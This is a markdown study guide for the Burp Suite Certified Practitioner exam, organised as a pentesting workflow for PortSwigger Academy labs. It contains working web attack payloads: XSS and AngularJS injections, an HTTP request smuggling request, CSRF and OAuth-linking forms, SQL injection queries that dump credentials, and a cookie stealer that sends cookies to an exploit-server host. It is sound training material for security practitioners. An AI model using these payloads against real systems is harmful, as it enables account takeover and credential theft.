# Methodology for BSCP Web App Pentesting Without Pro
For those who can't afford burp pro or cheapskates thogh you can't take an actual exam without pro. Note that this NOT a general pentesting methodology. For example in this workflow SQLi only appears in the stage 2 `get admin` but in reality it of course can be used for getting a normal user account.

## Flow

*Indicators* provide hints on how to **identify** vulnerabilities.

### Recon

#### List functionalities

Manually crawl the website with burp on.

##### login form, authentication  
    OAuth
    Password reset
    Host header
  
##### search, advanced search  
    XSS
    SQLi

##### blog posts  
    LFI
    File upload
    XSS
  
##### stock  
    XSS
    SQLi
    XXE
  
##### live chat  
    websocket

##### category filter  
    SQLi
  
##### email update  
    CSRF

##### API calls  
    IDOR
    GraphQL

##### feedback submission  
    OS command injections

##### No visible functionalities  
    cookies
    insecure deserialization
    cache poisoning
    


#### Fuzz

With burp pro you can right click a domain in the site map > Engagement tools > Disocover content, but it's not available in the community edition. However, you can use ffuf instead.

URL fuzz:
```bash
ffuf -u https://ID.web-security-academy.net/FUZZ -w /path/to/SecLists/Web-Content/common.txt -s -c
```


#### View source

Look for indicators and hints.

dev comments `<!--`  

Indicators:
```txt
ng-app
sanitizeKey()
.js files
<script> tags
type=hidden
&path=
```

DOM XSS sources and sinks:
```txt
---sources---
window.location
document.cookie
document.domain
WebSocket()
postMessage()
FileReader.readAsText()
sessionStorage.setItem()
location.search
URLSearchParams
---sinks---
document.write()
eval()
element.src
setRequestHeader()
ExecuteSql()
document.evaluate()
JSON.parse
replace()
innerHTML
addEventListener()
```


### Access any user account

#### git

Could be found with [fuzzing](#Fuzz)

Download .git:
```bash
wget -r https://ID.web-security-academy.net/.git/
```

Find contents in past commits:
```bash
git diff
git log -- FILENAME
git show COMMIT_ID:FILENAME
```

#### XSS

fuzz payload:
```js
<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(55)-"fuzzer
```

##### Reflected DOM

Indicator:  
In `/resources/js/searchResults.js`, `eval()` is used.

Working payload:
```js
\"-alert(1)}//
```

[Lab: Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)

##### Angular JS

indicators:
```html
ng-app
angular_VER.js
```

1.6+ payload:
```js
{{constructor.constructor('console.log(window.origin)')()}}
```

#### Cache poisoning

##### Unkeyed header

Indicator:
A js script that is fetched from a URL like this:
<script type="text/javascript" src="https://ID.web-security-academy.net/resources/js/tracking.js"></script>

Find unkeyed headers using [Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) extension. In this case, sending a request with `X-Forwarded-Host: exploit-ID.exploit-server.net` header works and you can host a [cookie stealer](#Cookie Stealer) script named `/resources/js/tracking.js`.

[Lab: Web cache poisoning with an unkeyed header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header)


#### Http request smuggling

Use [HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646) Extension.

##### Chained with reflected XSS

Indicator:  
A comment form contains `User-Agent` header as a hidden input.

Timining technique for checking CL.TE:
```html
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4
1
A
X
```

For CL.TE you don't have to use HTTP request smuggler extension but clicking the gear icon and turning on `update content length` is enough.

working payload:
```html
POST / HTTP/1.1
Host: 0a0d00f5041e114f80bf948800f20081.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
Transfer-Encoding: chunked
0

GET /post?postId=5
HTTP/1.1
User-Agent: "/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
x=1
```

[Lab: Exploiting HTTP request smuggling to deliver reflected XSS](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)

#### Bypass auth

##### email domain
Indicator: Registration form with a message that implies a specific email domain has access to the admin panel. 

When the server incorrectly handles a long email, you can register an email like example-super-long@subdomain.com.attacker.com. If the attacker.com part gets cut off, your registered email will have the subdomain.com email domain on their end.

[Lab: Inconsistent handling of exceptional input](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input)

#### Brute forcing

##### Flawed brute force protection

Indicator:  
Rate limit is in place but a successful login resets it.

Create a custom wordlist:
```bash
for i in {1..50}; do echo "carlos"; echo "carlos"; echo "wiener"; done > carlos.dict
```

Modify the [password wordlist](https://portswigger.net/web-security/authentication/auth-lab-passwords):
```bash
awk '{print; if (NR % 2 == 0) print "peter";}' pass.dict > pass2.dict
```
(`peter` appears after every second line)

Use Pitchfork attack in Intruder.

[Lab: Broken brute-force protection, IP block](https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block)

### Get admin

#### CSRF

##### Token validation depends on request method

Indicator:  
Deleting the csrf token parameter doesn't return an error when you change POST to GET.

[Lab: CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)

Working payload for this lab:
```html
<form action="https://ID.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="beefbowel@example.com">
</form>
<script>document.forms[0].submit();</script>
```

##### Attaching social media profile

Indicator:
The website has `attach a social media profile` feature and has implemented OAuth.  
A GET request to `/auth` doesn't have `state` parameter.

Copy your authorization code for `/auth-linking` before it's used by dropping the requet. Set the payload that contains the code at the exploit server:
```html
<img src="https://0a65004a03c8bdc08047122300410025.web-security-academy.net/oauth-linking?code=YOUR_AUTHORIZATION_CODE">
```
Deliver the payload to the victim and the victim's account will be attached to your account.

[Lab: Forced OAuth profile linking](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)

#### SQLi

##### Filter bypass via XML encoding

Indicators:
A POST request contains xml data like this: `<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>2</storeId></stockCheck>`  
Changing `ProductId` or `StoreId` to `'` returns an error or a warning message.

Use [Hackverter](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) extension to encode payloads. Check [database enumeration](#Database Enumeration).

[Lab: SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

#### CORS

#### JWT

#### Change password

#### Broken access control

### Read secret files

#### OS command injections

#### XXE

#### LFI

#### File uploading

#### SSRF

#### SSTI

#### Insecure deserialization

## Common Payloads and Commands

### Cookie stealer

```html
<script>
location='https://exploit-ID.exploit-server.net/?cookies='+document.cookie;
</script>
```
### Database Enumeration

Determine the number of columns of the target:
```sql
1 ORDER BY 1-- -
```

List databases:
```sql
1 UNION select schema_name from INFORMATION_SCHEMA.SCHEMATA-- -
```

List tables:
```sql
1 UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='public'-- -
```

List columns:
```sql
1 UNION select COLUMN_NAME || ':' || TABLE_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -
```

Get credentials:
```sql
1 UNION select username || ':' || password from users-- -
```

## References
[PortSwigger Academy Labs](https://portswigger.net/web-security/all-labs)  
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master)  
[Burp Suite Certified Practitioner Exam Study by botesjuan](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/README.md)  
